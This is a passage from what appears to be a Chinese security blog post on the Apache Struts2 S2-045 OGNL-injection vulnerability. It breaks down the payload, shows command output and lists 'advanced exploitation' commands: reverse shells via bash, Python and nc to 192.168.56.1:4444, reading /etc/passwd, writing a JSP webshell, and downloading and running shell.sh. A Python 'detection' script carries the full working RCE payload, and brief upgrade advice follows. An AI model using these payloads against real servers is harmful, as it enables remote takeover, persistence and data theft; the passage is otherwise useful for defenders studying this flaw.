&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedClasses().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;清除类名黑名单&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmd=&amp;#39;whoami&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;定义要执行的命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#iswin=...contains(&amp;#39;win&amp;#39;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;判断操作系统类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmds=(#iswin?&amp;#123;...&amp;#125;:&amp;#123;...&amp;#125;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;根据系统类型构造命令参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#p=new ProcessBuilder(#cmds)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;创建进程构建器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#process=#p.start()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;启动进程执行命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;IOUtils@copy(...)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;将命令输出写入HTTP响应&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;攻击效果演示&#34;&gt;&lt;a href=&#34;#攻击效果演示&#34; class=&#34;headerlink&#34; title=&#34;攻击效果演示&#34;&gt;&lt;/a&gt;攻击效果演示&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;请求发送后的响应&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt; OK&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Apache-Coyote/1.1&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html;charset=UTF-8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;9&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Wed, 24 Jul 2025 08:30:45 GMT&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;br&gt;&lt;span class=&#34;language-haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;高级利用技巧&#34;&gt;&lt;a href=&#34;#高级利用技巧&#34; class=&#34;headerlink&#34; title=&#34;高级利用技巧&#34;&gt;&lt;/a&gt;高级利用技巧&lt;/h2&gt;&lt;h3 id=&#34;1-信息收集命令&#34;&gt;&lt;a href=&#34;#1-信息收集命令&#34; class=&#34;headerlink&#34; title=&#34;1. 信息收集命令&#34;&gt;&lt;/a&gt;1. 信息收集命令&lt;/h3&gt;&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;uname -a&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 网络配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ifconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ps aux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 文件系统&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ls -la /&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-反弹Shell&#34;&gt;&lt;a href=&#34;#2-反弹Shell&#34; class=&#34;headerlink&#34; title=&#34;2. 反弹Shell&#34;&gt;&lt;/a&gt;2. 反弹Shell&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Bash反弹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Python反弹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;python -c &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;192.168.56.1\&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&amp;quot;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# NC反弹Shell  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;nc -e /bin/sh &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-文件操作&#34;&gt;&lt;a href=&#34;#3-文件操作&#34; class=&#34;headerlink&#34; title=&#34;3. 文件操作&#34;&gt;&lt;/a&gt;3. 文件操作&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 读取敏感文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;cat /etc/passwd&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 写入WebShell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;echo &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%@ page import=\&amp;quot;java.io.*\&amp;quot; %&amp;gt;&amp;lt;% String cmd = request.getParameter(\&amp;quot;cmd\&amp;quot;); Process p = Runtime.getRuntime().exec(cmd); %&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt; /tmp/shell.jsp&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 下载文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;wget http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;amp;&amp;amp; chmod +x /tmp/shell.sh &amp;amp;&amp;amp; /tmp/shell.sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;检测与防护&#34;&gt;&lt;a href=&#34;#检测与防护&#34; class=&#34;headerlink&#34; title=&#34;检测与防护&#34;&gt;&lt;/a&gt;检测与防护&lt;/h2&gt;&lt;h3 id=&#34;漏洞检测脚本&#34;&gt;&lt;a href=&#34;#漏洞检测脚本&#34; class=&#34;headerlink&#34; title=&#34;漏洞检测脚本&#34;&gt;&lt;/a&gt;漏洞检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight livescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs livescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;br&gt;def check_s2_045(url):&lt;br&gt;    payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#nike&lt;/span&gt;=&amp;#x27;multipart/form-data&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;):(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;[&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;]).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        )).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;=&amp;#x27;echo &amp;quot;S2045_VULN_TEST&amp;quot;&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.System@getProperty(&amp;#x27;os.name&amp;#x27;).toLowerCase().contains(&amp;#x27;win&amp;#x27;))).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&amp;#x27;cmd.exe&amp;#x27;,&amp;#x27;/c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&amp;#x27;/bin/bash&amp;#x27;,&amp;#x27;-c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;=new java.lang.ProcessBuilder(&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(true)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.start()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (@org.apache.commons.io.IOUtils@copy(&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;.flush())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;    &amp;#125;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    headers = &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Content-Type&amp;#x27;&lt;/span&gt;: payload,&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;User-Agent&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&amp;#x27;&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;br&gt;    try:&lt;br&gt;        response = requests.get(url, headers=headers, timeout=&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;S2045_VULN_TEST&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] &amp;#123;url&amp;#125; is vulnerable to S2-045!&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; True&lt;br&gt;        else:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[-] &amp;#123;url&amp;#125; is not vulnerable to S2-045&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;    except Exception &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; e:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Error testing &amp;#123;url&amp;#125;: &amp;#123;str(e)&amp;#125;&amp;quot;&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; len(sys.argv) != &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Usage: python3 s2-045-check.py &amp;lt;URL&amp;gt;&amp;quot;&lt;/span&gt;)&lt;br&gt;        sys.exit(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;br&gt;    target_url = sys.argv[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    check_s2_045(target_url)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;安全防护措施&#34;&gt;&lt;a href=&#34;#安全防护措施&#34; class=&#34;headerlink&#34; title=&#34;安全防护措施&#34;&gt;&lt;/a&gt;安全防护措施&lt;/h3&gt;&lt;h4 id=&#34;1-版本升级（根本解决方案）&#34;&gt;&lt;a href=&#34;#1-版本升级（根本解决方案）&#34; class=&#34;headerlink&#34; title=&#34;1. 版本升级（根本解决方案）&#34;&gt;&lt;/a&gt;1. 版本升级（根本解决方案）&lt;/h4&gt;&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 升级到安全版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Apache&lt;/span&gt; Struts &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;+ 或 &lt;span class=&#34;hljs-number&#34;&gt;2.5.10.1&lt;/span&gt;+&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;2-WAF规则配置&#34;&gt;&lt;a href=&#34;#2-WAF规则配置&#34; class=&#34;headerlink&#34; title=&#34;2. WAF规则配置&#34;&gt;&lt;/a&gt;2. WAF规则配置&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;ModSecurity规则&lt;/strong&gt;:&lt;/p&gt;
